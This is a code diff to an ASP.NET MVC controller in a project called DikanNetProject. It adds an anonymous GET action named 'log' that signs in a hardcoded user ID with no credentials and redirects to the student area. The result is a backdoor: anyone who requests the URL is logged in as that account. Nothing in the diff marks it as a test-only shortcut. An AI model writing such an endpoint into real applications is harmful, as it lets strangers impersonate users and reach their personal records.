@@ -367,5 +367,15 @@ namespace DikanNetProject.Controllers
            
         }
         #endregion
+
+        [HttpGet]
+        [AllowAnonymous]
+        public ActionResult log()
+        {
+            var user = UserManager.FindByName("315355057");
+            SignInManager.SignIn(user, false, false);
+            return RedirectToAction("Index","Student", null);
+
+        }
     }
 }
